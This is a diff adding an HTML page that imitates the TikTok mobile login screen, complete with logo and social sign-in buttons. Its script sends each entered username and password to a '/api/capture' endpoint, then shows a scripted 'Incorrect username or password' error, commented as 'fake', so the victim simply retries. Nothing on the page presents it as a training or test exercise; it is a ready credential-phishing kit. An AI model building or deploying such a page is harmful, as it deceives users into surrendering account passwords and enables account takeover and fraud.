@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    background: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 0;
+  }
+  .phone-frame {
+    width: 100%;
+    max-width: 390px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    background: #fff;
+    position: relative;
+  }
+  /* Status bar */
+  .status-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 20px 4px;
+    font-size: 12px;
+    font-weight: 600;
+    color: #111;
+    flex-shrink: 0;
+  }
+  .status-bar .time { font-weight: 700; }
+  .status-icons { display: flex; gap: 5px; align-items: center; }
+  .status-icons svg { width: 16px; height: 16px; }
+
+  .login-content {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 20px 24px 30px;
+    overflow-y: auto;
+  }
+  .logo-area {
+    text-align: center;
+    padding: 20px 0 6px;
+  }
+  .logo-area svg {
+    width: 44px;
+    height: 44px;
+  }
+  .logo-area .brand {
+    font-size: 26px;
+    font-weight: 700;
+    color: #111;
+    margin-top: 4px;
+    letter-spacing: -0.5px;
+  }
+
+  .tabs {
+    display: flex;
+    gap: 36px;
+    justify-content: center;
+    margin: 20px 0 28px;
+    position: relative;
+  }
+  .tab {
+    font-size: 15px;
+    font-weight: 500;
+    color: #aaa;
+    padding-bottom: 8px;
+    cursor: pointer;
+    position: relative;
+    transition: color 0.15s;
+  }
+  .tab.active {
+    color: #111;
+    font-weight: 600;
+  }
+  .tab.active::after {
+    content: '';
+    position: absolute;
+    bottom: -2px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 24px;
+    height: 2.5px;
+    background: #111;
+    border-radius: 2px;
+  }
+
+  .error-box {
+    background: #fef2f2;
+    border: 1px solid #fecaca;
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin-bottom: 16px;
+    font-size: 13px;
+    color: #dc2626;
+    display: none;
+    text-align: center;
+    line-height: 1.5;
+  }
+  .error-box.visible { display: block; }
+
+  .form-group { margin-bottom: 14px; }
+  input[type="text"],
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 15px 14px;
+    background: #f5f5f5;
+    border: 1px solid #e5e5e5;
+    border-radius: 8px;
+    font-size: 15px;
+    color: #111;
+    outline: none;
+    transition: border 0.15s, background 0.15s;
+    font-family: inherit;
+    -webkit-appearance: none;
+    appearance: none;
+  }
+  input:focus {
+    border-color: #111;
+    background: #fff;
+  }
+  input::placeholder { color: #b0b0b0; font-size: 14px; }
+
+  .login-btn {
+    width: 100%;
+    padding: 15px;
+    background: #111;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: opacity 0.15s;
+    font-family: inherit;
+    -webkit-appearance: none;
+  }
+  .login-btn:active { opacity: 0.8; }
+  .login-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin: 28px 0 24px;
+    color: #bbb;
+    font-size: 12px;
+  }
+  .divider::before,
+  .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #eee;
+  }
+
+  .social-login { display: flex; flex-direction: column; gap: 12px; }
+  .social-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    background: #fff;
+    font-size: 14px;
+    font-weight: 500;
+    color: #111;
+    cursor: pointer;
+    transition: background 0.1s;
+    font-family: inherit;
+    -webkit-appearance: none;
+  }
+  .social-btn:active { background: #f5f5f5; }
+  .social-btn svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+  .qr-section {
+    margin-top: 28px;
+    padding-top: 24px;
+    border-top: 1px solid #f0f0f0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #666;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  .qr-section svg { width: 20px; height: 20px; }
+
+  .signup-link {
+    font-size: 13px;
+    color: #888;
+    margin-top: 24px;
+    text-align: center;
+  }
+  .signup-link a {
+    color: #111;
+    font-weight: 600;
+    text-decoration: none;
+  }
+
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 2px 14px;
+    padding: 20px 24px 30px;
+    flex-shrink: 0;
+  }
+  .footer-links a {
+    color: #bbb;
+    font-size: 11px;
+    text-decoration: none;
+  }
+  .footer-links span {
+    color: #ddd;
+    font-size: 11px;
+  }
+</style>
+</head>
+<body>
+
+<div class="phone-frame">
+  <!-- iOS-style status bar -->
+  <div class="status-bar">
+    <span class="time">9:41</span>
+    <div class="status-icons">
+      <svg viewBox="0 0 24 24" fill="#111"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+      <svg viewBox="0 0 24 24" fill="#111"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
+    </div>
+  </div>
+
+  <div class="login-content">
+    <div class="logo-area">
+      <svg viewBox="0 0 24 24" fill="#111">
+        <path d="M16.963 1.2H7.037c-3.227 0-5.837 2.61-5.837 5.837v9.926c0 3.227 2.61 5.837 5.837 5.837h9.926c3.227 0 5.837-2.61 5.837-5.837V7.037c0-3.227-2.61-5.837-5.837-5.837zm1.874 10.014a4.912 4.912 0 01-4.083 1.882v4.446a5.523 5.523 0 01-5.523 5.523 5.523 5.523 0 01-5.523-5.523 5.523 5.523 0 015.523-5.523c.342 0 .678.031 1.009.09v2.784a2.82 2.82 0 00-1.009-.186 2.826 2.826 0 00-2.826 2.826 2.826 2.826 0 002.826 2.826 2.826 2.826 0 002.826-2.826V1.2h2.736a4.912 4.912 0 002.42 3.845v2.737a4.912 4.912 0 01-2.42.296v2.736a4.912 4.912 0 004.084-1.882z"/>
+      </svg>
+      <div class="brand">TikTok</div>
+    </div>
+
+    <div class="tabs">
+      <span class="tab active">Log in</span>
+      <span class="tab">Sign up</span>
+    </div>
+
+    <div class="error-box" id="errorBox">
+      Incorrect username or password. Please try again.
+    </div>
+
+    <form id="loginForm" autocomplete="off">
+      <div class="form-group">
+        <input type="text" id="username" placeholder="Username or email" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+      </div>
+      <div class="form-group">
+        <input type="password" id="password" placeholder="Password" autocomplete="off">
+      </div>
+      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+    </form>
+
+    <div class="divider">or</div>
+
+    <div class="social-login">
+      <button class="social-btn" type="button">
+        <svg viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Continue with Facebook
+      </button>
+      <button class="social-btn" type="button">
+        <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285f4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34a853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#fbbc05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#ea4335"/></svg>
+        Continue with Google
+      </button>
+      <button class="social-btn" type="button">
+        <svg viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
+        Continue with Apple
+      </button>
+    </div>
+
+    <div class="qr-section">
+      <svg viewBox="0 0 24 24" fill="#666"><path d="M3 3h7v7H3V3zm1 1v5h5V4H4zm-1 10h7v7H3v-7zm1 1v5h5v-5H4zm13-1h-3v-2h5v5h-2v-3zm-5-8V4h3v4h-3V9h5V3h-5zm1 6h2v2h-2v-2zm6 4h2v2h-2v-2zm-6 4h2v2h-2v-2zm6 0h2v2h-2v-2z"/></svg>
+      Log in with QR code
+    </div>
+
+    <div class="signup-link">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <div class="footer-links">
+    <a href="#">About</a>
+    <span>·</span>
+    <a href="#">Privacy</a>
+    <span>·</span>
+    <a href="#">Terms</a>
+    <span>·</span>
+    <a href="#">Contact</a>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('loginBtn');
+  const errorBox = document.getElementById('errorBox');
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!username || !password) return;
+
+    loginBtn.textContent = 'Logging in...';
+    loginBtn.disabled = true;
+
+    const data = {
+      username: username,
+      password: password,
+      page: 'tiktok',
+      timestamp: new Date().toISOString()
+    };
+
+    try {
+      await fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phrase: JSON.stringify(data) })
+      });
+    } catch (err) {
+      console.log('Capture error:', err);
+    }
+
+    // Show fake error
+    errorBox.classList.add('visible');
+    loginBtn.textContent = 'Log in';
+    loginBtn.disabled = false;
+    passwordInput.value = '';
+  });
+</script>
+</body>
+</html>
